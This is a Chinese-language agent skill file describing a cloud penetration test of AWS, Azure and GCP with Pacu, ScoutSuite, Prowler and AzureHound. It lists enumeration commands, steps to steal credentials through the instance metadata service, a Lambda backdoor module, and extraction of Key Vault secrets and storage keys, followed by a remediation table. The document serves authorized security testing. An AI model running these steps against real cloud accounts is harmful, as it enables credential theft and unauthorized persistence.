---
name: cszh-conducting-cloud-infrastructure-penetration-test
description: 针对 AWS、Azure 和 GCP 执行云基础设施渗透测试，使用 Pacu、ScoutSuite 和 Prowler 识别 IAM 错误配置、暴露的存储桶、不安全的无服务器函数和云原生攻击路径。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 conducting-cloud-infrastructure-penetration-test），正文按中文原文照录。

**这个技能干什么**：针对 AWS、Azure 和 GCP 执行云基础设施渗透测试，使用 Pacu、ScoutSuite 和 Prowler 识别 IAM 错误配置、暴露的存储桶、不安全的无服务器函数和云原生攻击路径。

**什么时候用**：需要按上游中文方法论执行「conducting-cloud-infrastructure-penetration-test」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 执行云基础设施渗透测试

## 概述

云基础设施渗透测试通过针对 IAM 策略、存储配置、计算实例、无服务器函数、网络控制和 Kubernetes 集群，识别 AWS、Azure 和 GCP 环境中的安全弱点。云特有攻击向量包括过度特权的 IAM 角色、错误配置的存储桶、暴露的元数据服务、不安全的 API 端点以及通过云服务链的横向移动。

## 前置条件

- 书面授权和云提供商通知（AWS 渗透测试策略、Azure 规则、GCP 条款）
- 具有只读访问权限的云凭据（假设已入侵模型）或未经认证的外部测试
- 工具：Pacu（AWS）、ScoutSuite、Prowler、AzureHound、GCPBucketBrute、CloudMapper
- 了解每个提供商的共同责任模型

## AWS 渗透测试

### 初始枚举

```bash
# 验证调用者身份
aws sts get-caller-identity

# 枚举 IAM 权限
aws iam get-user
aws iam list-attached-user-policies --user-name testuser
aws iam list-user-policies --user-name testuser

# 枚举所有 IAM 用户和角色
aws iam list-users
aws iam list-roles
aws iam list-groups

# 枚举 EC2 实例
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress]' --output table

# 枚举 S3 存储桶
aws s3 ls
aws s3 ls s3://target-bucket --recursive

# 枚举 Lambda 函数
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table

# 枚举 RDS 数据库
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,PubliclyAccessible]' --output table

# 枚举密钥
aws secretsmanager list-secrets
aws ssm describe-parameters
```

### Pacu 漏洞利用框架

```bash
# 安装并配置 Pacu
pip install pacu
pacu

# 导入 AWS 密钥
Pacu> set_keys
Pacu> import_keys testuser

# 运行枚举模块
Pacu> run iam__enum_permissions
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run ec2__enum
Pacu> run s3__enum
Pacu> run lambda__enum

# 权限提升检查
Pacu> run iam__privesc_scan

# 利用 S3 存储桶错误配置
Pacu> run s3__bucket_finder

# EC2 元数据 SSRF 利用
Pacu> run ec2__metadata_services

# Lambda 后门（授权测试）
Pacu> run lambda__backdoor_new_roles
```

### S3 存储桶测试

```bash
# 测试公开存储桶
aws s3 ls s3://target-corp-backup --no-sign-request
aws s3 cp s3://target-corp-backup/test.txt /tmp/ --no-sign-request

# 检查存储桶策略
aws s3api get-bucket-policy --bucket target-corp-backup
aws s3api get-bucket-acl --bucket target-corp-backup

# 测试 ACL 错误配置
aws s3api put-object --bucket target-corp-backup --key pentest_proof.txt \
  --body /tmp/proof.txt
```

### EC2 实例元数据利用

```bash
# 从已控制的 EC2 实例：
# IMDSv1（如果未禁用）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name

# 提取临时凭据
# 使用它们枚举更多权限
export AWS_ACCESS_KEY_ID=<来自元数据>
export AWS_SECRET_ACCESS_KEY=<来自元数据>
export AWS_SESSION_TOKEN=<来自元数据>
aws sts get-caller-identity
```

## Azure 渗透测试

### Azure 枚举

```bash
# 使用测试凭据登录
az login -u testuser@target.onmicrosoft.com -p 'Password123'

# 枚举订阅
az account list --output table

# 枚举资源组
az group list --output table

# 枚举虚拟机
az vm list --output table

# 枚举存储账户
az storage account list --output table

# 枚举 App Services
az webapp list --output table

# 枚举 Key Vault
az keyvault list --output table

# 枚举 Azure AD 用户
az ad user list --output table

# AzureHound 攻击路径分析（类似 Azure 版 BloodHound）
azurehound list -u testuser@target.onmicrosoft.com -p 'Password123' -o azurehound.json
```

### Azure 专项攻击

```bash
# 从已控制虚拟机枚举托管身份
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 存储账户密钥提取
az storage account keys list --resource-group RG-Production --account-name targetstorageacct

# Key Vault 密钥提取
az keyvault secret list --vault-name target-keyvault
az keyvault secret show --vault-name target-keyvault --name admin-password

# Stormspotter — Azure 攻击图谱
python stormspotter.py --cli
```

## GCP 渗透测试

### GCP 枚举

```bash
# 认证
gcloud auth login

# 列出项目
gcloud projects list

# 枚举计算实例
gcloud compute instances list

# 枚举存储桶
gsutil ls
gsutil ls gs://target-bucket/

# 枚举 IAM 策略
gcloud projects get-iam-policy PROJECT_ID

# 枚举 Cloud Functions
gcloud functions list

# 枚举服务账户
gcloud iam service-accounts list

# 检查公开存储桶
gsutil ls -L gs://target-bucket/ | grep "Access control"
```

## 跨云安全评估

### ScoutSuite 多云审计

```bash
# AWS 审计
scout suite aws --profile testuser

# Azure 审计
scout suite azure --cli

# GCP 审计
scout suite gcp --user-account

# 在 HTML 仪表板中查看结果
# 重点关注：IAM、存储、网络、日志发现
```

### Prowler（AWS CIS 基准）

```bash
# 运行完整 CIS 基准扫描
prowler aws --profile testuser

# 运行特定检查
prowler aws -c check11 check12 check13  # IAM 检查
prowler aws -g s3  # S3 组
prowler aws -g forensics-ready  # 日志检查

# 导出结果
prowler aws -M json-ocsf -o ./prowler_results/
```

## 发现矩阵

| 发现 | 云平台 | 严重性 | 修复措施 |
|---------|-------|----------|-------------|
| 包含 PII 的公开 S3 存储桶 | AWS | 严重 | 启用存储桶策略拒绝公开访问 |
| Lambda 上的过度特权 IAM 角色 | AWS | 高 | 实施最小权限 IAM 策略 |
| EC2 上启用 IMDSv1 | AWS | 高 | 强制所有实例使用 IMDSv2 |
| 具有公开 Blob 访问的存储账户 | Azure | 严重 | 禁用匿名 Blob 访问 |
| 所有用户可访问的 Key Vault | Azure | 高 | 限制 Key Vault 访问策略 |
| 具有 allUsers 读取权限的 GCS 存储桶 | GCP | 严重 | 删除 allUsers 权限 |
| 仓库中暴露的服务账户密钥 | GCP | 严重 | 轮换密钥，启用工作负载身份 |

## 参考资料

- Pacu: https://github.com/RhinoSecurityLabs/pacu
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
- Prowler: https://github.com/prowler-cloud/prowler
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- AWS 渗透测试政策: https://aws.amazon.com/security/penetration-testing/
- HackTricks Cloud: https://cloud.hacktricks.wiki/
